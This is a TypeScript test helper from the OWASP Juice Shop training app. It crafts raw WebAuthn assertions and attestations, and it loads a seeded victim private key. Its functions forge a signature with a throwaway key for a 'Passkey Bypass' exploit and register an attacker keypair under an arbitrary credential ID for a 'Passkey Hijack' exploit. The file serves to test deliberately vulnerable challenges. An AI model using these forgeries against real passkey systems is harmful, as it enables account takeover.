/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import crypto from 'node:crypto'
import fs from 'node:fs'
import path from 'node:path'
import { isoBase64URL, isoCBOR } from '@simplewebauthn/server/helpers'

type CBORType = Parameters<typeof isoCBOR.encode>[0]

// The server derives the relying party from the request's Host/X-Forwarded-* headers (see
// routes/webauthn.ts). Tests send `Host: localhost:3000` unless they exercise another origin.
export const ORIGIN = 'http://localhost:3000'

export interface CraftOptions {
  origin?: string
  flags?: number
}

export interface VictimCredential {
  credentialID: string
  publicKeyCose: string
  privateKeyPem: string
}

export interface WebAuthnAssertion {
  id: string
  rawId: string
  type: 'public-key'
  clientExtensionResults: Record<string, unknown>
  response: {
    authenticatorData: string
    clientDataJSON: string
    signature: string
  }
}

export interface WebAuthnAttestation {
  id: string
  rawId: string
  type: 'public-key'
  clientExtensionResults: Record<string, unknown>
  response: {
    attestationObject: string
    clientDataJSON: string
    transports: string[]
  }
}

const sha256 = (b: Buffer) => crypto.createHash('sha256').update(b).digest()

/** The seeded victim passkey plus its matching private key, for crafting raw assertions. */
export function loadVictimCredential (): VictimCredential {
  const file = path.resolve(__dirname, '../../files/passkeyVictimCredential.json')
  return JSON.parse(fs.readFileSync(file, 'utf8'))
}

// authenticatorData = rpIdHash(32) | flags(1) | signCount(4) | [attestedCredentialData]
export function authData (rpID: string, flags: number, counter: number, attested?: Buffer) {
  const f = Buffer.from([flags])
  const c = Buffer.alloc(4)
  c.writeUInt32BE(counter)
  return Buffer.concat([sha256(Buffer.from(rpID)), f, c, ...(attested ? [attested] : [])])
}

// COSE EC2/ES256 public key from a Node JWK.
export function coseFromJwk (jwk: { x: string, y: string }) {
  const x = isoBase64URL.toBuffer(jwk.x)
  const y = isoBase64URL.toBuffer(jwk.y)
  const b = [0xa5, 1, 2, 3, 0x26, 0x20, 1, 0x21, 0x58, 0x20, ...x, 0x22, 0x58, 0x20, ...y]
  return Buffer.from(b)
}

function clientDataJSON (type: 'webauthn.get' | 'webauthn.create', challenge: string, origin: string) {
  return Buffer.from(JSON.stringify({ type, challenge, origin, crossOrigin: false }))
}

/**
 * Mint an ES256 assertion for the victim credential. With `tamper` the signature is produced with a
 * throwaway key of the same curve: well-formed DER that fails verification against the victim's
 * stored public key (the "Passkey Bypass" exploit). A genuine assertion is signed with
 * the victim's own key.
 */
export function buildAssertion (victim: VictimCredential, challenge: string, { tamper, counter = 1, origin = ORIGIN, flags = 0x05 }: { tamper: boolean, counter?: number } & CraftOptions): WebAuthnAssertion {
  const clientData = clientDataJSON('webauthn.get', challenge, origin)
  const ad = authData(new URL(origin).hostname, flags, counter) // default flags: UP | UV
  const signed = Buffer.concat([ad, sha256(clientData)])
  const key = tamper
    ? crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' }).privateKey
    : crypto.createPrivateKey(victim.privateKeyPem)
  const signature = crypto.sign('sha256', signed, { key, dsaEncoding: 'der' })
  return {
    id: victim.credentialID,
    rawId: victim.credentialID,
    type: 'public-key',
    clientExtensionResults: {},
    response: {
      authenticatorData: isoBase64URL.fromBuffer(ad),
      clientDataJSON: isoBase64URL.fromBuffer(clientData),
      signature: isoBase64URL.fromBuffer(signature)
    }
  }
}

/**
 * Forge a registration for an arbitrary credentialID using a freshly generated attacker keypair
 * (the "Passkey Hijack" exploit). Returns the attestation, the base64url COSE public key the server
 * is expected to persist, and the attacker's private key so a follow-up login can be signed with it.
 */
export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45, aaguid = '00000000-0000-0000-0000-000000000000' }: CraftOptions & { aaguid?: string } = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' })
  const cose = coseFromJwk(publicKey.export({ format: 'jwk' }) as { x: string, y: string })

  const credId = isoBase64URL.toBuffer(credentialID)
  const credIdLen = Buffer.alloc(2)
  credIdLen.writeUInt16BE(credId.length)
  const attested = Buffer.concat([Buffer.from(aaguid.replace(/-/g, ''), 'hex'), credIdLen, credId, cose])
  const ad = authData(new URL(origin).hostname, flags, 0, attested) // default flags: UP | UV | AT

  const attestationObject = Buffer.from(isoCBOR.encode(new Map<string, CBORType>([
    ['fmt', 'none'],
    ['attStmt', new Map<string, CBORType>()],
    ['authData', ad]
  ])))
  const clientData = clientDataJSON('webauthn.create', challenge, origin)

  return {
    attestation: {
      id: credentialID,
      rawId: credentialID,
      type: 'public-key',
      clientExtensionResults: {},
      response: {
        attestationObject: isoBase64URL.fromBuffer(attestationObject),
        clientDataJSON: isoBase64URL.fromBuffer(clientData),
        transports: ['internal']
      }
    },
    publicKey: isoBase64URL.fromBuffer(cose),
    privateKeyPem: privateKey.export({ format: 'pem', type: 'pkcs8' }).toString()
  }
}

/** Flip a single bit of a base64url-encoded value (e.g. an assertion signature). */
export function flipBit (value: string, byteIndex: number, mask = 0x01) {
  const buf = Buffer.from(isoBase64URL.toBuffer(value))
  const i = byteIndex < 0 ? buf.length + byteIndex : byteIndex
  buf[i] ^= mask
  return isoBase64URL.fromBuffer(buf)
}
